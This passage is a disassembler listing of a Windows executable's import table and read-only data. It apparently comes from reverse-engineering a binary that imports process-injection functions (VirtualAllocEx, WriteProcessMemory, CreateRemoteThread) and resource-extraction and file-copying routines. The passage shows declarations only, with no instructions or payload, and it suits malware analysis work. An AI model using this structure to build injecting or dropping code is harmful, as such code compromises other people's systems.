.idata:00403054 ; DWORD (__stdcall *GetLastError)()
.idata:00403054                 extrn GetLastError:dword
.idata:00403054                                         ; CODE XREF: sub_401FD0+220↑p
.idata:00403054                                         ; DATA XREF: sub_401FD0+220↑r
.idata:00403054                                         ; KERNEL32
.idata:00403058 ; BOOL (__stdcall *SetFileAttributesA)(LPCSTR lpFileName, DWORD dwFileAttributes)
.idata:00403058                 extrn SetFileAttributesA:dword
.idata:00403058                                         ; CODE XREF: sub_401FD0+1B1↑p
.idata:00403058                                         ; DATA XREF: sub_401FD0+1B1↑r
.idata:00403058                                         ; KERNEL32
.idata:0040305C ; BOOL (__stdcall *CopyFileA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists)
.idata:0040305C                 extrn CopyFileA:dword   ; CODE XREF: sub_401FD0+160↑p
.idata:0040305C                                         ; DATA XREF: sub_401FD0+160↑r
.idata:0040305C                                         ; KERNEL32
.idata:00403060 ; BOOL (__stdcall *CloseHandle)(HANDLE hObject)
.idata:00403060                 extrn CloseHandle:dword ; CODE XREF: sub_4023C0+50↑p
.idata:00403060                                         ; DATA XREF: sub_4023C0+50↑r
.idata:00403060                                         ; KERNEL32
.idata:00403064 ; HANDLE (__stdcall *GetCurrentProcess)()
.idata:00403064                 extrn GetCurrentProcess:dword
.idata:00403064                                         ; CODE XREF: sub_401390+EA↑p
.idata:00403064                                         ; sub_401390+161↑p
.idata:00403064                                         ; DATA XREF: ...
.idata:00403064                                         ; KERNEL32
.idata:00403068 ; HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
.idata:00403068                 extrn CreateFileA:dword ; CODE XREF: sub_4023C0+2B↑p
.idata:00403068                                         ; DATA XREF: sub_4023C0+2B↑r
.idata:00403068                                         ; KERNEL32
.idata:0040306C ; HGLOBAL (__stdcall *GlobalFree)(HGLOBAL hMem)
.idata:0040306C                 extrn GlobalFree:dword  ; CODE XREF: sub_402460+A3↑p
.idata:0040306C                                         ; sub_402460:loc_40253D↑p
.idata:0040306C                                         ; DATA XREF: ...
.idata:0040306C                                         ; KERNEL32
.idata:00403070 ; LPVOID (__stdcall *LockResource)(HGLOBAL hResData)
.idata:00403070                 extrn LockResource:dword
.idata:00403070                                         ; CODE XREF: sub_402460+69↑p
.idata:00403070                                         ; DATA XREF: sub_402460+69↑r
.idata:00403070                                         ; KERNEL32
.idata:00403074 ; HGLOBAL (__stdcall *GlobalAlloc)(UINT uFlags, SIZE_T dwBytes)
.idata:00403074                 extrn GlobalAlloc:dword ; CODE XREF: sub_402460+5C↑p
.idata:00403074                                         ; DATA XREF: sub_402460+5C↑r
.idata:00403074                                         ; KERNEL32
.idata:00403078 ; HGLOBAL (__stdcall *LoadResource)(HMODULE hModule, HRSRC hResInfo)
.idata:00403078                 extrn LoadResource:dword
.idata:00403078                                         ; CODE XREF: sub_402460+4D↑p
.idata:00403078                                         ; DATA XREF: sub_402460+4D↑r
.idata:00403078                                         ; KERNEL32
.idata:0040307C ; DWORD (__stdcall *SizeofResource)(HMODULE hModule, HRSRC hResInfo)
.idata:0040307C                 extrn SizeofResource:dword
.idata:0040307C                                         ; CODE XREF: sub_402460+42↑p
.idata:0040307C                                         ; DATA XREF: sub_402460+42↑r
.idata:0040307C                                         ; KERNEL32
.idata:00403080 ; HRSRC (__stdcall *FindResourceA)(HMODULE hModule, LPCSTR lpName, LPCSTR lpType)
.idata:00403080                 extrn FindResourceA:dword
.idata:00403080                                         ; CODE XREF: sub_402460+33↑p
.idata:00403080                                         ; DATA XREF: sub_402460+33↑r
.idata:00403080                                         ; KERNEL32
.idata:00403084 ; BOOL (__stdcall *SetPriorityClass)(HANDLE hProcess, DWORD dwPriorityClass)
.idata:00403084                 extrn SetPriorityClass:dword
.idata:00403084                                         ; CODE XREF: sub_401390+F3↑p
.idata:00403084                                         ; sub_401390+139↑p ...
.idata:00403084                                         ; KERNEL32
.idata:00403088 ; HANDLE (__stdcall *GetCurrentThread)()
.idata:00403088                 extrn GetCurrentThread:dword
.idata:00403088                                         ; CODE XREF: sub_401390+FD↑p
.idata:00403088                                         ; sub_401390+168↑p
.idata:00403088                                         ; DATA XREF: ...
.idata:00403088                                         ; KERNEL32
.idata:0040308C ; BOOL (__stdcall *SetThreadPriority)(HANDLE hThread, int nPriority)
.idata:0040308C                 extrn SetThreadPriority:dword
.idata:0040308C                                         ; CODE XREF: sub_401390+106↑p
.idata:0040308C                                         ; sub_401390+142↑p ...
.idata:0040308C                                         ; KERNEL32
.idata:00403090 ; DWORD (__stdcall *ResumeThread)(HANDLE hThread)
.idata:00403090                 extrn ResumeThread:dword
.idata:00403090                                         ; CODE XREF: sub_401390+149↑p
.idata:00403090                                         ; DATA XREF: sub_401390+149↑r
.idata:00403090                                         ; KERNEL32
.idata:00403094 ; void (__stdcall *Sleep)(DWORD dwMilliseconds)
.idata:00403094                 extrn Sleep:dword       ; CODE XREF: sub_401260+F1↑p
.idata:00403094                                         ; sub_401510+87↑p ...
.idata:00403094                                         ; KERNEL32
.idata:00403098 ; void (__stdcall *GetStartupInfoA)(LPSTARTUPINFOA lpStartupInfo)
.idata:00403098                 extrn GetStartupInfoA:dword
.idata:00403098                                         ; CODE XREF: sub_401150+1B↑p
.idata:00403098                                         ; start+104↑p
.idata:00403098                                         ; DATA XREF: ...
.idata:00403098                                         ; KERNEL32
.idata:0040309C ; BOOL (__stdcall *CreateProcessA)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation)
.idata:0040309C                 extrn CreateProcessA:dword
.idata:0040309C                                         ; CODE XREF: sub_401150+4D↑p
.idata:0040309C                                         ; sub_401390+128↑p ...
.idata:0040309C                                         ; KERNEL32
.idata:004030A0 ; int (__stdcall *lstrlenA)(LPCSTR lpString)
.idata:004030A0                 extrn lstrlenA:dword    ; CODE XREF: sub_401150+76↑p
.idata:004030A0                                         ; sub_401150+9A↑p ...
.idata:004030A0                                         ; KERNEL32
.idata:004030A4 ; LPVOID (__stdcall *VirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
.idata:004030A4                 extrn VirtualAllocEx:dword
.idata:004030A4                                         ; CODE XREF: sub_401150+81↑p
.idata:004030A4                                         ; DATA XREF: sub_401150+81↑r
.idata:004030A4                                         ; KERNEL32
.idata:004030A8 ; BOOL (__stdcall *WriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten)
.idata:004030A8                 extrn WriteProcessMemory:dword
.idata:004030A8                                         ; CODE XREF: sub_401150+A5↑p
.idata:004030A8                                         ; DATA XREF: sub_401150+A5↑r
.idata:004030A8                                         ; KERNEL32
.idata:004030AC ; HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName)
.idata:004030AC                 extrn GetModuleHandleA:dword
.idata:004030AC                                         ; CODE XREF: sub_401150+C3↑p
.idata:004030AC                                         ; start+128↑p
.idata:004030AC                                         ; DATA XREF: ...
.idata:004030AC                                         ; KERNEL32
.idata:004030B0 ; FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName)
.idata:004030B0                 extrn GetProcAddress:dword
.idata:004030B0                                         ; CODE XREF: sub_401150+CA↑p
.idata:004030B0                                         ; DATA XREF: sub_401150+CA↑r
.idata:004030B0                                         ; KERNEL32
.idata:004030B4 ; HANDLE (__stdcall *CreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)
.idata:004030B4                 extrn CreateRemoteThread:dword
.idata:004030B4                                         ; CODE XREF: sub_401150+ED↑p
.idata:004030B4                                         ; DATA XREF: sub_401150+ED↑r
.idata:004030B4                                         ; KERNEL32
.idata:004030B8 ; UINT (__stdcall *GetSystemWindowsDirectoryA)(LPSTR lpBuffer, UINT uSize)
.idata:004030B8                 extrn GetSystemWindowsDirectoryA:dword
.idata:004030B8                                         ; CODE XREF: sub_401000+1D↑p
.idata:004030B8                                         ; DATA XREF: sub_401000+1D↑r
.idata:004030B8                                         ; KERNEL32
.idata:004030BC ; UINT (__stdcall *GetSystemDirectoryA)(LPSTR lpBuffer, UINT uSize)
.idata:004030BC                 extrn GetSystemDirectoryA:dword
.idata:004030BC                                         ; CODE XREF: sub_401000+2F↑p
.idata:004030BC                                         ; sub_401000+41↑p ...
.idata:004030BC                                         ; KERNEL32
.idata:004030C0 ; BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)
.idata:004030C0                 extrn WriteFile:dword   ; CODE XREF: sub_4023C0+49↑p
.idata:004030C0                                         ; DATA XREF: sub_4023C0+49↑r
.idata:004030C0                                         ; KERNEL32
.idata:004030C4
.idata:004030C8 ;
.idata:004030C8 ; Imports from MFC42.DLL
.idata:004030C8 ;
.idata:004030C8 ; int __stdcall operator+(_DWORD, _DWORD, _DWORD)
.idata:004030C8                 extrn __imp_??H@YG?AVCString@@ABV0@PBD@Z:dword
.idata:004030C8                                         ; DATA XREF: operator+(CString const &,char const *)↑r
.idata:004030C8                                         ; .rdata:00403304↓o
.idata:004030C8                                         ; Import by ordinal 924
.idata:004030CC ; __declspec(dllimport) public: __thiscall CString::~CString(void)
.idata:004030CC                 extrn __imp_??1CString@@QAE@XZ:dword
.idata:004030CC                                         ; DATA XREF: CString::~CString(void)↑r
.idata:004030CC                                         ; Import by ordinal 800
.idata:004030D0 ; int __thiscall CString::operator+=(_DWORD, _DWORD)
.idata:004030D0                 extrn __imp_??YCString@@QAEABV0@PBD@Z:dword
.idata:004030D0                                         ; DATA XREF: CString::operator+=(char const *)↑r
.idata:004030D0                                         ; Import by ordinal 941
.idata:004030D4 ; __declspec(dllimport) public: __thiscall CString::CString(class CString const &)
.idata:004030D4                 extrn __imp_??0CString@@QAE@ABV0@@Z:dword
.idata:004030D4                                         ; DATA XREF: CString::CString(CString const &)↑r
.idata:004030D4                                         ; Import by ordinal 535
.idata:004030D8 ; __declspec(dllimport) public: __thiscall CString::CString(char const *)
.idata:004030D8                 extrn __imp_??0CString@@QAE@PBD@Z:dword
.idata:004030D8                                         ; DATA XREF: CString::CString(char const *)↑r
.idata:004030D8                                         ; Import by ordinal 537
.idata:004030DC
.idata:004030E0 ;
.idata:004030E0 ; Imports from MSVCP60.dll
.idata:004030E0 ;
.idata:004030E0 ; public: __thiscall std::_Winit::_Winit(void)
.idata:004030E0                 extrn ??0_Winit@std@@QAE@XZ:dword
.idata:004030E0                                         ; DATA XREF: sub_4025D0+5↑r
.idata:004030E0                                         ; .rdata:0040332C↓o
.idata:004030E0                                         ; MSVCP60
.idata:004030E4 ; public: __thiscall std::_Winit::~_Winit(void)
.idata:004030E4                 extrn ??1_Winit@std@@QAE@XZ:dword
.idata:004030E4                                         ; DATA XREF: sub_4025F0+5↑r
.idata:004030E4                                         ; MSVCP60
.idata:004030E8 ; public: __thiscall std::ios_base::Init::~Init(void)
.idata:004030E8                 extrn ??1Init@ios_base@std@@QAE@XZ:dword
.idata:004030E8                                         ; DATA XREF: sub_4025B0+5↑r
.idata:004030E8                                         ; MSVCP60
.idata:004030EC ; public: __thiscall std::ios_base::Init::Init(void)
.idata:004030EC                 extrn ??0Init@ios_base@std@@QAE@XZ:dword
.idata:004030EC                                         ; DATA XREF: sub_402590+5↑r
.idata:004030EC                                         ; MSVCP60
.idata:004030F0
.idata:004030F4 ;
.idata:004030F4 ; Imports from MSVCRT.dll
.idata:004030F4 ;
.idata:004030F4 ; unsigned int (__cdecl *_controlfp)(unsigned int NewValue, unsigned int Mask)
.idata:004030F4                 extrn __imp__controlfp:dword
.idata:004030F4                                         ; DATA XREF: _controlfp↑r
.idata:004030F4                                         ; .rdata:00403318↓o
.idata:004030F4                                         ; MSVCRT
.idata:004030F8 ; void (__cdecl *_set_app_type)(_crt_app_type Type)
.idata:004030F8                 extrn __set_app_type:dword ; CODE XREF: start+2D↑p
.idata:004030F8                                         ; DATA XREF: start+2D↑r
.idata:004030F8                                         ; MSVCRT
.idata:004030FC ; int __CxxFrameHandler(void)
.idata:004030FC                 extrn __imp___CxxFrameHandler:dword
.idata:004030FC                                         ; DATA XREF: __CxxFrameHandler↑r
.idata:004030FC                                         ; MSVCRT
.idata:00403100 ; int (*snprintf)(char *const Buffer, const size_t BufferCount, const char *const Format, ...)
.idata:00403100                 extrn _snprintf:dword   ; CODE XREF: sub_401840+9A↑p
.idata:00403100                                         ; DATA XREF: sub_401840+9A↑r
.idata:00403100                                         ; MSVCRT
.idata:00403104 ; void (__cdecl *free)(void *Block)
.idata:00403104                 extrn free:dword        ; CODE XREF: sub_401900+234↑p
.idata:00403104                                         ; DATA XREF: sub_401900+234↑r
.idata:00403104                                         ; MSVCRT
.idata:00403108 ; size_t (__cdecl *fwrite)(const void *Buffer, size_t ElementSize, size_t ElementCount, FILE *Stream)
.idata:00403108                 extrn fwrite:dword      ; CODE XREF: sub_401900+226↑p
.idata:00403108                                         ; DATA XREF: sub_401900+226↑r
.idata:00403108                                         ; MSVCRT
.idata:0040310C ; int (__cdecl *fclose)(FILE *Stream)
.idata:0040310C                 extrn fclose:dword      ; CODE XREF: sub_401900+1B7↑p
.idata:0040310C                                         ; sub_401900+22D↑p
.idata:0040310C                                         ; DATA XREF: ...
.idata:0040310C                                         ; MSVCRT
.idata:00403110 ; size_t (__cdecl *fread)(void *Buffer, size_t ElementSize, size_t ElementCount, FILE *Stream)
.idata:00403110                 extrn fread:dword       ; CODE XREF: sub_401900+1B0↑p
.idata:00403110                                         ; DATA XREF: sub_401900+1B0↑r
.idata:00403110                                         ; MSVCRT
.idata:00403114 ; void *(__cdecl *malloc)(size_t Size)
.idata:00403114                 extrn malloc:dword      ; CODE XREF: sub_401900+18F↑p
.idata:00403114                                         ; DATA XREF: sub_401900+18F↑r
.idata:00403114                                         ; MSVCRT
.idata:00403118 ; int (__cdecl *ftell)(FILE *Stream)
.idata:00403118                 extrn ftell:dword       ; CODE XREF: sub_401900+17F↑p
.idata:00403118                                         ; DATA XREF: sub_401900+17F↑r
.idata:00403118                                         ; MSVCRT
.idata:0040311C ; int (__cdecl *fseek)(FILE *Stream, int Offset, int Origin)
.idata:0040311C                 extrn fseek:dword       ; CODE XREF: sub_401900+17C↑p
.idata:0040311C                                         ; sub_401900+18C↑p
.idata:0040311C                                         ; DATA XREF: ...
.idata:0040311C                                         ; MSVCRT
.idata:00403120 ; FILE *(__cdecl *fopen)(const char *FileName, const char *Mode)
.idata:00403120                 extrn fopen:dword       ; CODE XREF: sub_401900+169↑p
.idata:00403120                                         ; sub_401900+212↑p
.idata:00403120                                         ; DATA XREF: ...
.idata:00403120                                         ; MSVCRT
.idata:00403124 ; void (__cdecl __noreturn *exit)(int Code)
.idata:00403124                 extrn exit:dword        ; CODE XREF: WinMain(x,x,x,x)+F5↑p
.idata:00403124                                         ; WinMain(x,x,x,x)+2BF↑p ...
.idata:00403124                                         ; MSVCRT
.idata:00403128 ; char *(__cdecl *strstr)(const char *Str, const char *SubStr)
.idata:00403128                 extrn strstr:dword      ; CODE XREF: sub_401FD0+A6↑p
.idata:00403128                                         ; sub_401FD0+BB↑p
.idata:00403128                                         ; DATA XREF: ...
.idata:00403128                                         ; MSVCRT
.idata:0040312C ; int (__cdecl *strncmp)(const char *Str1, const char *Str2, size_t MaxCount)
.idata:0040312C                 extrn strncmp:dword     ; CODE XREF: sub_401FD0+6D↑p
.idata:0040312C                                         ; DATA XREF: sub_401FD0+6D↑r
.idata:0040312C                                         ; MSVCRT
.idata:00403130 ; int _except_handler3(void)
.idata:00403130                 extrn __imp__except_handler3:dword
.idata:00403130                                         ; DATA XREF: _except_handler3↑r
.idata:00403130                                         ; MSVCRT
.idata:00403134 ; _onexit_t __cdecl __dllonexit(_DWORD, _DWORD, _DWORD)
.idata:00403134                 extrn __imp___dllonexit:dword
.idata:00403134                                         ; DATA XREF: __dllonexit↑r
.idata:00403134                                         ; MSVCRT
.idata:00403138 ; _onexit_t (__cdecl *onexit)(_onexit_t Func)
.idata:00403138                 extrn _onexit:dword     ; CODE XREF: __onexit+D↑p
.idata:00403138                                         ; DATA XREF: __onexit+D↑r
.idata:00403138                                         ; MSVCRT
.idata:0040313C ; void (__cdecl __noreturn *exit)(int Code)
.idata:0040313C                 extrn _exit:dword       ; CODE XREF: start+158↑p
.idata:0040313C                                         ; DATA XREF: start+158↑r
.idata:0040313C                                         ; MSVCRT
.idata:00403140 ; int _XcptFilter(void)
.idata:00403140                 extrn __imp__XcptFilter:dword
.idata:00403140                                         ; DATA XREF: _XcptFilter↑r
.idata:00403140                                         ; MSVCRT
.idata:00403144 ; char *acmdln
.idata:00403144                 extrn _acmdln:dword     ; DATA XREF: start+CD↑r
.idata:00403144                                         ; MSVCRT
.idata:00403148 ; int __cdecl _getmainargs(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD)
.idata:00403148                 extrn __getmainargs:dword ; CODE XREF: start+B5↑p
.idata:00403148                                         ; DATA XREF: start+B5↑r
.idata:00403148                                         ; MSVCRT
.idata:0040314C ; void (__cdecl *_initterm)(_PVFV *First, _PVFV *Last)
.idata:0040314C                 extrn __imp__initterm:dword
.idata:0040314C                                         ; DATA XREF: _initterm↑r
.idata:0040314C                                         ; MSVCRT
.idata:00403150 ; void (__cdecl *_setusermatherr)(_UserMathErrorFunctionPointer UserMathErrorFunction)
.idata:00403150                 extrn __setusermatherr:dword
.idata:00403150                                         ; CODE XREF: start+7C↑p
.idata:00403150                                         ; DATA XREF: start+7C↑r
.idata:00403150                                         ; MSVCRT
.idata:00403154                 extrn _adjust_fdiv:dword ; DATA XREF: start+5E↑r
.idata:00403154                                         ; MSVCRT
.idata:00403158 ; int *(__cdecl *_p__commode)()
.idata:00403158                 extrn __p__commode:dword ; CODE XREF: start+50↑p
.idata:00403158                                         ; DATA XREF: start+50↑r
.idata:00403158                                         ; MSVCRT
.idata:0040315C ; int *(__cdecl *_p__fmode)()
.idata:0040315C                 extrn __p__fmode:dword  ; CODE XREF: start+42↑p
.idata:0040315C                                         ; DATA XREF: start+42↑r
.idata:0040315C                                         ; MSVCRT
.idata:00403160
.idata:00403164 ;
.idata:00403164 ; Imports from USER32.dll
.idata:00403164 ;
.idata:00403164 ; int (__stdcall *MessageBoxA)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)
.idata:00403164                 extrn MessageBoxA:dword ; CODE XREF: WinMain(x,x,x,x)+1D↑p
.idata:00403164                                         ; WinMain(x,x,x,x)+2D8↑p ...
.idata:00403164                                         ; USER32
.idata:00403168
.idata:0040316C ;
.idata:0040316C ; Imports from comdlg32.dll
.idata:0040316C ;
.idata:0040316C ; __int16 (__stdcall *GetFileTitleA)(LPCSTR, LPSTR Buf, WORD cchSize)
.idata:0040316C                 extrn GetFileTitleA:dword
.idata:0040316C                                         ; CODE XREF: sub_401FD0+8E↑p
.idata:0040316C                                         ; DATA XREF: sub_401FD0+8E↑r ...
.idata:0040316C                                         ; comdlg32
.idata:00403170
.idata:00403174 ;
.idata:00403174 ; Imports from ole32.dll
.idata:00403174 ;
.idata:00403174 ; void (__stdcall *CoUninitialize)()
.idata:00403174                 extrn CoUninitialize:dword
.idata:00403174                                         ; CODE XREF: sub_401840:loc_4018E3↑p
.idata:00403174                                         ; DATA XREF: sub_401840:loc_4018E3↑r ...
.idata:00403174                                         ; ole32
.idata:00403178 ; HRESULT (__stdcall *CoCreateGuid)(GUID *pguid)
.idata:00403178                 extrn CoCreateGuid:dword
.idata:00403178                                         ; CODE XREF: sub_401840+10↑p
.idata:00403178                                         ; DATA XREF: sub_401840+10↑r
.idata:00403178                                         ; ole32
.idata:0040317C ; HRESULT (__stdcall *CoInitialize)(LPVOID pvReserved)
.idata:0040317C                 extrn CoInitialize:dword
.idata:0040317C                                         ; CODE XREF: sub_401840+5↑p
.idata:0040317C                                         ; DATA XREF: sub_401840+5↑r
.idata:0040317C                                         ; ole32
.idata:00403180
.idata:00403180
.rdata:00403184 ; ===========================================================================
.rdata:00403184
.rdata:00403184 ; Segment type: Pure data
.rdata:00403184 ; Segment permissions: Read
.rdata:00403184 _rdata          segment para public 'DATA' use32
.rdata:00403184                 assume cs:_rdata
.rdata:00403184                 ;org 403184h
.rdata:00403184                 align 8
.rdata:00403188 stru_403188     _SCOPETABLE_ENTRY <0FFFFFFFFh, 0, offset loc_4022EC>
.rdata:00403188                                         ; DATA XREF: sub_401FD0+5↑o
.rdata:00403194                 align 8
.rdata:00403198 stru_403198     _SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_4027B2, offset loc_4027C6>
.rdata:00403198                                         ; DATA XREF: start+5↑o
.rdata:004031A4                 align 8
.rdata:004031A8 stru_4031A8     FuncInfoV1 <19930520h, 2, offset stru_4031C8, 0, 0, 0, 0>
.rdata:004031A8                                         ; DATA XREF: sub_401260:SEH_401260↑o
.rdata:004031C4                 db    0
.rdata:004031C5                 db    0
.rdata:004031C6                 db    0
.rdata:004031C7                 db    0
.rdata:004031C8 stru_4031C8     UnwindMapEntry <-1, offset loc_402800>
.rdata:004031C8                                         ; DATA XREF: .rdata:stru_4031A8↑o
.rdata:004031D0                 UnwindMapEntry <0, offset loc_40280B>
.rdata:004031D8 stru_4031D8     FuncInfoV1 <19930520h, 2, offset stru_4031F8, 0, 0, 0, 0>
.rdata:004031D8                                         ; DATA XREF: sub_401510:SEH_401510↑o
.rdata:004031F4                 db    0
.rdata:004031F5                 db    0
.rdata:004031F6                 db    0
.rdata:004031F7                 db    0
.rdata:004031F8 stru_4031F8     UnwindMapEntry <-1, offset loc_402820>
.rdata:004031F8                                         ; DATA XREF: .rdata:stru_4031D8↑o
.rdata:00403200                 UnwindMapEntry <-1, offset loc_40282B>
.rdata:00403208 stru_403208     FuncInfoV1 <19930520h, 2, offset stru_403228, 0, 0, 0, 0>
.rdata:00403208                                         ; DATA XREF: sub_401B90:SEH_401B90↑o
.rdata:00403224                 db    0
.rdata:00403225                 db    0
.rdata:00403226                 db    0
.rdata:00403227                 db    0
.rdata:00403228 stru_403228     UnwindMapEntry <-1, offset loc_402840>
.rdata:00403228                                         ; DATA XREF: .rdata:stru_403208↑o
.rdata:00403230                 UnwindMapEntry <-1, offset loc_40284B>
.rdata:00403238 stru_403238     FuncInfoV1 <19930520h, 1, offset stru_403258, 0, 0, 0, 0>
.rdata:00403238                                         ; DATA XREF: sub_4023C0:SEH_4023C0↑o
.rdata:00403254                 db    0
.rdata:00403255                 db    0
.rdata:00403256                 db    0
.rdata:00403257                 db    0
.rdata:00403258 stru_403258     UnwindMapEntry <-1, offset loc_402860>
.rdata:00403258                                         ; DATA XREF: .rdata:stru_403238↑o
.rdata:00403260 stru_403260     FuncInfoV1 <19930520h, 2, offset stru_403280, 0, 0, 0, 0>
.rdata:00403260                                         ; DATA XREF: sub_402460:SEH_402460↑o
.rdata:0040327C                 db    0
.rdata:0040327D                 db    0
.rdata:0040327E                 db    0
.rdata:0040327F                 db    0
.rdata:00403280 stru_403280     UnwindMapEntry <-1, offset loc_402880>
.rdata:00403280                                         ; DATA XREF: .rdata:stru_403260↑o
.rdata:00403288                 UnwindMapEntry <0, offset loc_402888>
.rdata:00403290 __IMPORT_DESCRIPTOR_KERNEL32 dd rva off_403384 ; Import Name Table
.rdata:00403294                 dd 0                    ; Time stamp
.rdata:00403298                 dd 0                    ; Forwarder Chain
.rdata:0040329C                 dd rva aKernel32Dll     ; DLL Name
.rdata:004032A0                 dd rva lstrcatA         ; Import Address Table
.rdata:004032A4 __IMPORT_DESCRIPTOR_USER32 dd rva off_4034A8 ; Import Name Table
.rdata:004032A8                 dd 0                    ; Time stamp
.rdata:004032AC                 dd 0                    ; Forwarder Chain
.rdata:004032B0                 dd rva aUser32Dll       ; DLL Name
.rdata:004032B4                 dd rva MessageBoxA      ; Import Address Table
.rdata:004032B8 __IMPORT_DESCRIPTOR_comdlg32 dd rva off_4034B0 ; Import Name Table
.rdata:004032BC                 dd 0                    ; Time stamp
.rdata:004032C0                 dd 0                    ; Forwarder Chain
.rdata:004032C4                 dd rva aComdlg32Dll     ; DLL Name
.rdata:004032C8                 dd rva GetFileTitleA    ; Import Address Table
.rdata:004032CC __IMPORT_DESCRIPTOR_ADVAPI32 dd rva off_403344 ; Import Name Table
.rdata:004032D0                 dd 0                    ; Time stamp
.rdata:004032D4                 dd 0                    ; Forwarder Chain
.rdata:004032D8                 dd rva aAdvapi32Dll     ; DLL Name
.rdata:004032DC                 dd rva CloseServiceHandle ; Import Address Table
.rdata:004032E0 __IMPORT_DESCRIPTOR_ole32 dd rva off_4034B8 ; Import Name Table
.rdata:004032E4                 dd 0                    ; Time stamp
.rdata:004032E8                 dd 0                    ; Forwarder Chain
.rdata:004032EC                 dd rva aOle32Dll        ; DLL Name
.rdata:004032F0                 dd rva CoUninitialize   ; Import Address Table
.rdata:004032F4 __IMPORT_DESCRIPTOR_MFC42 dd rva dword_40340C ; Import Name Table
.rdata:004032F8                 dd 0                    ; Time stamp
.rdata:004032FC                 dd 0                    ; Forwarder Chain
.rdata:00403300                 dd rva aMfc42Dll        ; DLL Name
.rdata:00403304                 dd rva __imp_??H@YG?AVCString@@ABV0@PBD@Z ; Import Address Table
.rdata:00403308 __IMPORT_DESCRIPTOR_MSVCRT dd rva off_403438 ; Import Name Table
.rdata:0040330C                 dd 0                    ; Time stamp
.rdata:00403310                 dd 0                    ; Forwarder Chain
.rdata:00403314                 dd rva aMsvcrtDll       ; DLL Name
.rdata:00403318                 dd rva __imp__controlfp ; Import Address Table
.rdata:0040331C __IMPORT_DESCRIPTOR_MSVCP60 dd rva off_403424 ; Import Name Table
.rdata:00403320                 dd 0                    ; Time stamp
.rdata:00403324                 dd 0                    ; Forwarder Chain
.rdata:00403328                 dd rva aMsvcp60Dll      ; DLL Name
.rdata:0040332C                 dd rva ??0_Winit@std@@QAE@XZ ; Import Address Table
.rdata:00403330                 db    0
.rdata:00403331                 db    0
.rdata:00403332                 db    0
.rdata:00403333                 db    0
.rdata:00403334                 db    0
.rdata:00403335                 db    0
.rdata:00403336                 db    0
.rdata:00403337                 db    0
.rdata:00403338                 db    0
.rdata:00403339                 db    0
.rdata:0040333A                 db    0
.rdata:0040333B                 db    0
.rdata:0040333C                 db    0
.rdata:0040333D                 db    0
.rdata:0040333E                 db    0
.rdata:0040333F                 db    0
.rdata:00403340                 db    0
.rdata:00403341                 db    0
.rdata:00403342                 db    0
.rdata:00403343                 db    0
.rdata:00403344 ;
.rdata:00403344 ; Import names for ADVAPI32.dll
.rdata:00403344 ;
.rdata:00403344 off_403344      dd rva word_403816      ; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_ADVAPI32↑o
.rdata:00403348                 dd rva word_403806
.rdata:0040334C                 dd rva word_4037F2
.rdata:00403350                 dd rva word_4037D4
.rdata:00403354                 dd rva word_4037C4
.rdata:00403358                 dd rva word_4037A6
.rdata:0040335C                 dd rva word_403792
.rdata:00403360                 dd rva word_403784
.rdata:00403364                 dd rva word_403772
.rdata:00403368                 dd rva word_403760
.rdata:0040336C                 dd rva word_403752
.rdata:00403370                 dd rva word_40383C
.rdata:00403374                 dd rva word_40384C
.rdata:00403378                 dd rva word_40385E
.rdata:0040337C                 dd rva word_40382C
.rdata:00403380                 dd 0
.rdata:00403384 ;
.rdata:00403384 ; Import names for KERNEL32.dll
.rdata:00403384 ;
.rdata:00403384 off_403384      dd rva word_4035F8      ; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_KERNEL32↑o
.rdata:00403388                 dd rva word_403604
.rdata:0040338C                 dd rva word_403610
.rdata:00403390                 dd rva word_40362A
.rdata:00403394                 dd rva word_40363E
.rdata:00403398                 dd rva word_403654
.rdata:0040339C                 dd rva word_403664
.rdata:004033A0                 dd rva word_40367A
.rdata:004033A4                 dd rva word_403686
.rdata:004033A8                 dd rva word_4035E4
.rdata:004033AC                 dd rva word_4036A0
.rdata:004033B0                 dd rva word_4036AE
.rdata:004033B4                 dd rva word_4036BC
.rdata:004033B8                 dd rva word_4036CC
.rdata:004033BC                 dd rva word_4036DA
.rdata:004033C0                 dd rva word_4036EA
.rdata:004033C4                 dd rva word_4036FC
.rdata:004033C8                 dd rva word_4035D0
.rdata:004033CC                 dd rva word_4035BC
.rdata:004033D0                 dd rva word_4035A8
.rdata:004033D4                 dd rva word_403598
.rdata:004033D8                 dd rva word_403590
.rdata:004033DC                 dd rva word_40357E
.rdata:004033E0                 dd rva word_40356C
.rdata:004033E4                 dd rva word_403560
.rdata:004033E8                 dd rva word_40354E
.rdata:004033EC                 dd rva word_403538
.rdata:004033F0                 dd rva word_403524
.rdata:004033F4                 dd rva word_403512
.rdata:004033F8                 dd rva word_4034FC
.rdata:004033FC                 dd rva word_4034DE
.rdata:00403400                 dd rva word_4034C8
.rdata:00403404                 dd rva word_403694
.rdata:00403408                 dd 0
.rdata:0040340C ;
.rdata:0040340C ; Import names for MFC42.DLL
.rdata:0040340C ;
